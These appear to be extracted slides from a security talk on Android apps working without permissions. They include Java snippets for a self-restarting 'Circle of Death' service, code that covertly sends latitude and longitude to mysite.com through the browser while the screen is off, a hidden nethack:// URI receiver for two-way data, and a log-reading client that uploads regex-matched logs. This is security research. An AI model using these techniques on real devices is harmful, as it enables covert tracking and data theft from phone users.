    // MaliciousActivity
    protected void onDestroy() {
        super.onDestroy();
        startService(new Intent(getApplicationContext(), RestartService.class));
    }
CIRCLE OF DEATH 
WITH 0 PERMISSIONS
• To remove boot into safe 
mode (No non-system 
apps are able to run) and 
uninstall the malicious 
application.
• Bonus points: Maximize 
volume and play an 
obnoxious sound.
CIRCLE OF DEATH 
WITH 0 PERMISSIONS
• Apps or games not requesting 
INTERNET seem low risk.
• Your sandbox can’t access the 
internet.
• Ask your neighbor! 
• Pop open a browser.
NetHack
startActivity(new Intent(Intent.ACTION_VIEW,
    Uri.parse("http://mysite.com/data?lat=" + lat + "&lon=" + lon)));
UPLOAD
WITH 0 PERMISSIONS
• Can we do this secretly?
• Obscuring browser (onPause()) 
stops page from loading.
32.175.xxx.xxx - - [03:30:36] "GET /data?lat=123.2&lon=32.2 HTTP/1.1" 404 203
UPLOAD
WITH 0 PERMISSIONS
• How about we only pop up browsers when the screen is off?
• Need to close browser when the screen turns on
• Bonus Points: Redirect to http://www.google.com 
when you’re done (or read browser history from logs)
UPLOAD
WITH 0 PERMISSIONS
          // Lets send if no one is looking!
          PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
          if (!pm.isScreenOn()) {
              Log.e("NetHack", "Screen off");
              startActivity(new Intent(Intent.ACTION_VIEW,
                  Uri.parse("http://mysite/data?lat=" + lat + "&lon=" + lon)).setFlags
                  (Intent.FLAG_ACTIVITY_NEW_TASK));
              mBrowserDisplayed = true;
          } else if (mBrowserDisplayed) {
              Log.e("NetHack", "Screen on");
              startActivity(new Intent(Intent.ACTION_MAIN).addCategory
                  (Intent.CATEGORY_HOME));
              mBrowserDisplayed = false;
          }
But what about two way communication?
UPLOAD
WITH 0 PERMISSIONS
INTERNET
WITH 0 PERMISSIONS
• Pop browser to page with downloadable content-type             
(http://mysite.com/data.zip)
• Default Android browser automatically saves it to /sdcard/
downloads/data.zip
• But there are some downsides...
• No way to clear notiﬁcations
• To clean up the ﬁlesystem you need 
to request 
WRITE_EXTERNAL_STORAGE
• Automatically requested if you 
target Android 1.5
INTERNET
WITH 0 PERMISSIONS
• How about a custom URI receiver?
• Google Maps uses 
geo:latitude,longitude?zoom 
to automatically launch their App
• We can do the same!
INTERNET
WITH 0 PERMISSIONS
• We can register ourselves for nethack://
• Redirect our page from before to 
nethack:data?param=server_data
• This has to be an , not a  
(It is meant for foreground interactions)
INTERNET
WITH 0 PERMISSIONS
• Activity is never seen if you call ﬁnish() in onCreate()
• Data is available in the Intent
• Bonus Points: New tab for nethack URI and redirect original 
page to http://google.com
public class NetHackReceiver extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.e("NetHack", "URI: " + getIntent().toURI());
        ﬁnish(); // So no one ever sees this activity
    }
}
E/NetHack ( 8647): URI: nethack:data?param=MySecret
#Intent;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;la
unchFlags=0x400000;component=com.lookout.nethack/.NetHack;end
INTERNET
WITH 0 PERMISSIONS
INTERNET
WITH 0 PERMISSIONS
Demo
APPLICATION LOGGING
import android.util.Log;
...
public class MyClass {
...
private static final String TAG = "MyLogTag";
...
Log.d(TAG, "Some log content goes here”);
...
}
LOG DEVICES
• Main – /dev/log/main
• Events – /dev/log/events
• Radio – /dev/log/radio
• System – /dev/log/system
/DEV/LOG/EVENTS
“This is not the main "logcat" debugging log (Log)! 
These diagnostic events are for system integrators, 
not application authors.”
(android.util.EventLog reference)
I/force_gc(  372): bg
I/dvm_gc_info(  372): [8462382925454000962,-9202961561028941785,-4012281790553425882,8525709]
I/dvm_gc_madvise_info(  363): [688128,311296]
I/dvm_gc_madvise_info(  372): [479232,311296]
I/force_gc(  382): bg
I/dvm_gc_info(  382): [7526750061301363334,-9210279910440200153,-4012281790553425882,8525709]
I/force_gc(  178): bg
I/dvm_gc_madvise_info(  382): [512000,307200]
I/dvm_gc_info(  178): [8315180330336522432,-9221538084707051476,-4007778190926055386,8525813]
I/force_gc(  567): bg
I/dvm_gc_info(  567): [7218827569570034728,-9170310257555277784,-4011718840600004570,8525709]
I/dvm_gc_madvise_info(  178): [671744,311296]
I/dvm_gc_madvise_info(  567): [483328,315392]
I/force_gc(  235): bg
I/dvm_gc_info(  235): [7146757855084082108,-9181568294349572049,-4006370816042502106,8554528]
I/dvm_gc_madvise_info(  235): [638976,303104]
I/dvm_gc_info( 1225): [7161125164967880680,-8904595954992383958,-3999052466648025050,8628270]
I/dvm_gc_madvise_info( 1225): [2109440,311296]
I/battery_level(   89): [95,4188,281]
I/force_gc(  235): bg
I/dvm_gc_info(  235): [7146757855084016338,-9201834492672739281,-4006370816042502106,8554528]
I/dvm_gc_madvise_info(  235): [638976,303104]
/DEV/LOG/RADIO
• Radio command stream and debug data
D/CDMA    (  182): [CdmaDataConnection] DataConnection.clearSettings()
D/CDMA    (  182): [DataConnection] Stop poll NetStat
D/CDMA    (  182): [CdmaDataConnectionTracker] setState: IDLE
D/CDMA    (  182): [CdmaDataConnectionTracker] ***trySetupData due to dataEnabled
D/CDMA    (  182): [CdmaDataConnection] DataConnection.getState()
D/CDMA    (  182): [HtcRadio] Data state:ResourceReleaseWaiting -> Connecting, released=true
D/CDMA    (  182): [DGRD1] dataState=CONNECTING, mode=0x44800000->44800000
D/CDMA    (  182): [CdmaDataConnection] CdmaDataConnection Connecting...
D/RILJ    (  182): [0399]> SETUP_DATA_CALL 0 0 null null null 3
D/CDMA    (  182): [CdmaDataConnectionTracker] setState: INITING
D/HTC_RIL (   53): ril_func_conﬁg_and_activate_pdp():called
D/HTC_RIL (   53): ril_func_conﬁg_and_activate_pdp():0,0
D/HTC_RIL (   53): @(t=1280205773)>> 13:up:   3
D/RILJ    (  182): WAKE_LOCK_TIMEOUT  mReqPending=0 mRequestList=1
D/RILJ    (  182): 0: [399] SETUP_DATA_CALL
I/HTC_RIL (   53): queue_get(): timeout (20000 msec) to get!
D/HTC_RIL (   53): qmi_send_recv_procedure():QMI timeout (up:   3) 1 time(s)
D/RILJ    (  182): [0399] LAST_DATA_CALL_FAIL_CAUSE
D/HTC_RIL (   53): ril_func_get_last_pdp_fail_cause():called
D/HTC_RIL (   53): @(t=1280205793)>> 13:poll
D/HTC_RIL (   53): qmi_read_thread():qmi read thread got [[STATE=down
/DEV/LOG/MAIN
I/wpa_supplicant( 1483): CTRL-EVENT-SCAN-RESULTS  Ready
I/wpa_supplicant( 1483): wpa_disabled_ssid_list_clear
E/wpa_supplicant( 1483): wpa_supplicant_ctrl_iface_ap_scan: 1
V/WiﬁMonitor(   89): Event [wpa_disabled_ssid_list_clear]
D/AlarmManager(   89): scheduleTimeTickEvent: Current time 1280206500021
D/AlarmManager(   89): scheduleTimeTickEvent: Next TIME_TICK broadcast time 1280206560000
D/StatusBarPolicy(   89): Received Intent: android.intent.action.TIME_TICK
D/StatusBarPolicy(   89): Current time is 1280206500084
D/StatusBar(   89): performAddUpdateIcon icon=IconData(slot='clock' text='9:55 PM') notiﬁcation=null 
key=android.os.Binder@46ac2d10
I/ClockWidget(  202): weatherClock onReceive~ action:android.intent.action.TIME_TICK mPaused:true
I/wpa_supplicant( 1483): CTRL-EVENT-SCAN-RESULTS  Ready
I/wpa_supplicant( 1483): wpa_disabled_ssid_list_clear
E/wpa_supplicant( 1483): wpa_supplicant_ctrl_iface_ap_scan: 1
V/WiﬁMonitor(   89): Event [wpa_disabled_ssid_list_clear]
I/wpa_supplicant( 1483): CTRL-EVENT-SCAN-RESULTS  Ready
I/wpa_supplicant( 1483): wpa_disabled_ssid_list_clear
E/wpa_supplicant( 1483): wpa_supplicant_ctrl_iface_ap_scan: 1
V/WiﬁMonitor(   89): Event [wpa_disabled_ssid_list_clear]
I/wpa_supplicant( 1483): CTRL-EVENT-SCAN-RESULTS  Ready
I/wpa_supplicant( 1483): wpa_disabled_ssid_list_clear
E/wpa_supplicant( 1483): wpa_supplicant_ctrl_iface_ap_scan: 1
V/WiﬁMonitor(   89): Event [wpa_disabled_ssid_list_clear]
LOGCAT
$ adb logcat 
D/dalvikvm(  189): GC freed 480 objects / 22376 bytes in 70ms
D/HtcLockScreen(   85): onRefreshBatteryInfo: 15
I/global  (   85): Default buffer size used in BufferedReader constructor. It would be better 
to be explicit if an 8k-char buffer is required.
I/global  (   85): Default buffer size used in BufferedReader constructor. It would be better 
to be explicit if an 8k-char buffer is required.
D/BatteryService(   85): isUsbConnected() = true
D/BatteryService(   85): mPlugType = 2
D/WiﬁService(   85): ACTION_BATTERY_CHANGED pluggedType: 2
D/UsbConnectedReceiver(  216): action = psclient.intent.action.usb_status
D/UsbConnectedReceiver(  216): ACTION_BATTERY_CHANGED
D/UsbConnectedReceiver(  216): usbCurrentType = 2
D/UsbConnectedReceiver(  216): Current type is same as previous, return!
D/dalvikvm(  146): GC freed 72 objects / 3232 bytes in 99ms
D/dalvikvm(  146): GC freed 107 objects / 4360 bytes in 83ms
D/HtcLockScreen(   85): onRefreshBatteryInfo: 16
I/global  (   85): Default buffer size used in BufferedReader constructor. It would be better 
to be explicit if an 8k-char buffer is required.
I/global  (   85): Default buffer size used in BufferedReader constructor. It would be better 
to be explicit if an 8k-char buffer is required.
D/WiﬁService(   85): ACTION_BATTERY_CHANGED pluggedType: 2
D/BatteryService(   85): isUsbConnected() = true
D/BatteryService(   85): mPlugType = 2
D/UsbConnectedReceiver(  216): action = psclient.intent.action.usb_status
D/UsbConnectedReceiver(  216): ACTION_BATTERY_CHANGED
D/UsbConnectedReceiver(  216): usbCurrentType = 2
D/UsbConnectedReceiver(  216): Current type is same as previous, return!
PERMISSIONS
• Ability to read logs is gated by android.permission.READ_LOGS
• shell is granted this permission for adb debugging
• READ_LOGS is in some ways an alias for READ*
public static final String READ_LOGS
Since: API Level 1
Allows an application to read the low-level system log files. These can contain slightly 
private information about what is happening on the device, but should never contain 
the user's private information.
Constant Value: "android.permission.READ_LOGS"
THE CLIENT
• Android Service that requests:
• android.permission.READ_LOGS
• android.permission.INTERNET
• Downloads policies from the server
• Periodically delivers logs matching regex
LOGCATDEVICE
public class LogcatDevice extends LogSource {
...
public void open() throws IOException {
StringBuilder command = new StringBuilder("logcat");
File devFile = new File(DEVLOG + buffer);
if (devFile.exists())